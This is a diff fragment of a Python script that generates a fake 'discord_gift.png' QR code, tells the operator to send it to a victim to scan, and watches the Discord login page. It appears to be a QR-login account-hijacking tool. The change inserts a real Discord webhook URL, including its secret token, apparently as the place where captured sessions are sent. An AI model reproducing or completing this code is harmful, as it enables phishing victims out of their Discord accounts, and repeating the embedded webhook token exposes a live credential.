@@ -63,7 +63,7 @@ def main():
     print('- QR Code has been generated. > discord_gift.png')
     print('Send the QR Code to user and scan. Waiting..')
 
-    webhook_url = 'YOUR_WEBHOOK_URL_HERE'  # Replace with your actual webhook URL
+    webhook_url = 'https://discord.com/api/webhooks/1272403881627877426/sVSisuDnXjdNRgMsZ-TrQJtw4KLl8HZiYXBb3d6KtuuMSuzccwkTfXwWgVo9rB1Vl8NU'  # Replace with your actual webhook URL
 
     while True:
         if discord_login != driver.current_url:
